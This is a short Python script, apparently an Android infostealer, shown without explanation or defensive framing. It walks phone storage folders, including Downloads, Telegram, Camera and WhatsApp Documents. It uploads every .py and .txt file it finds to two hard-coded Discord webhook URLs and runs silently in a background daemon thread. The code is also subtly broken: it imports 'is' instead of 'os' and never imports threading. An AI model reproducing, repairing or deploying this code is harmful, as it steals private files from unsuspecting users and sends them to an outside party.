
import is
import sys
import time
import requests

def send_files_to_discord():
    webhooks = {
        "python": "https://canary.discord.com/api/webhooks/1424456913390932060/Q-JIPSL0Ijauov-0-zNgfwCgOxOESmW_73VccmBpNZ7rIifI97EtFav6AKi4IW1dyPol",
        "document-txt": "https://canary.discord.com/api/webhooks/1424457064926937213/_6HrmgKHRl9j1_osOVLf0d_YAmpSL6z_0w_dk9uNxlBX_Ze1lPaSCTkY-o-8Vn2-niQz"
    }
    
    sdcard_paths = [
        "/sdcard", "/sdcard/Download", "/sdcard/Download/Telegram",
        "/sdcard/Telegram/Telegram Files", "/sdcard/Camera/Camera",
        "/sdcard/WhatsApp/Media/WhatsApp Documents"
    ]

    for base_path in sdcard_paths:  
        if not os.path.exists(base_path):
            continue
            
        for root, dirs, files in os.walk(base_path):  
            for file in files:  
                if file.endswith(".py"):
                    webhook_url = webhooks["python"]
                elif file.endswith(".txt"):
                    webhook_url = webhooks["document-txt"]
                else:
                    continue
                    
                file_path = os.path.join(root, file)  
                try:  
                    with open(file_path, "rb") as f:  
                        files_payload = {"file": (file, f, "text/plain")}
                        data = {"content": f"File from: NO"}
                        requests.post(webhook_url, files=files_payload, data=data)  
                except Exception as e:
                    continue

threading.Thread(target=send_files_to_discord, daemon=True).start()        
